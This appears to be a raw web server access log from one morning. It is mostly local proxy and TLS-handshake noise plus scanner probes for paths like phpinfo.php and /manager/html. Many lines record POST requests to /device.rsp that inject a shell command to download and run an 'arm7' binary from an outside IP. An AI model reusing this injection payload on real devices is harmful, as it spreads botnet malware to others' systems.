127.0.0.1 - - [19/Feb/2025:09:19:33 +0300] "CONNECT www.jetbrains.com:443 HTTP/1.1" 405 224
208.110.70.42 - - [19/Feb/2025:09:21:15 +0300] "GET /restore.php HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:09:21:29 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:21:29 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:21:31 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:21:31 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:21:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:21:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:21:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:21:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:21:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:22:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:09:22:56 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:09:23:05 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:23:05 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:23:05 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:23:05 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:24:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:24:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
46.19.143.10 - - [19/Feb/2025:09:26:38 +0300] "GET / HTTP/1.1" 200 15513
91.224.92.10 - - [19/Feb/2025:09:28:00 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:09:31:31 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:09:31:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:31:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:34:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:34:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:09:38:12 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:09:40:27 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:09:41:13 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:41:13 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:42:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:44:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:44:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:09:46:45 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
92.246.87.21 - - [19/Feb/2025:09:46:46 +0300] "GET / HTTP/1.1" 200 15289
91.224.92.10 - - [19/Feb/2025:09:51:11 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:09:51:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:51:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:52:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
80.82.77.202 - - [19/Feb/2025:09:53:29 +0300] "GET / HTTP/1.0" 200 15289
91.224.92.10 - - [19/Feb/2025:09:53:49 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:09:54:12 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:09:54:12 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:09:54:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:54:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:54:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:54:45 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:54:55 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
127.0.0.1 - - [19/Feb/2025:09:54:55 +0300] "CONNECT plugins.jetbrains.com:443 HTTP/1.1" 405 224
91.224.92.10 - - [19/Feb/2025:09:57:53 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:01:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:01:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:01:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:01:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:02:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
193.68.89.10 - - [19/Feb/2025:10:03:03 +0300] "GET / HTTP/1.1" 200 15269
91.224.92.10 - - [19/Feb/2025:10:04:03 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:04:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:04:54 +0300] "\x16\x03\x01\x07" 400 226
91.224.92.10 - - [19/Feb/2025:10:07:33 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
172.168.41.42 - - [19/Feb/2025:10:11:04 +0300] "GET /manager/html HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:11:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:11:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:12:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:10:12:57 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:10:14:52 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:14:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:14:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
64.62.156.52 - - [19/Feb/2025:10:20:10 +0300] "GET / HTTP/1.1" 200 15269
91.224.92.10 - - [19/Feb/2025:10:20:53 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:21:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:21:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:22:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:10:23:43 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
46.19.143.10 - - [19/Feb/2025:10:23:52 +0300] "GET / HTTP/1.1" 200 15269
64.62.156.55 - - [19/Feb/2025:10:24:09 +0300] "GET /favicon.ico HTTP/1.1" 404 196
64.62.156.59 - - [19/Feb/2025:10:24:48 +0300] "GET /geoserver/web/ HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:24:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:24:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
64.62.156.63 - - [19/Feb/2025:10:25:39 +0300] "GET /info.php HTTP/1.1" 404 196
64.62.156.64 - - [19/Feb/2025:10:25:50 +0300] "GET /phpinfo.php HTTP/1.1" 404 196
64.62.156.61 - - [19/Feb/2025:10:25:53 +0300] "GET /dashboard/phpinfo.php HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:10:29:49 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:31:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:31:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:32:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:10:34:15 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:10:34:19 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:34:19 +0300] "\x16\x03\x01\x07" 400 226
92.255.57.58 - - [19/Feb/2025:10:35:22 +0300] "GET / HTTP/1.1" 200 15269
91.224.92.10 - - [19/Feb/2025:10:38:32 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
92.255.57.58 - - [19/Feb/2025:10:40:01 +0300] "GET / HTTP/1.1" 200 15269
127.0.0.1 - - [19/Feb/2025:10:41:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:41:54 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:10:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:42:54 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:10:42:54 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
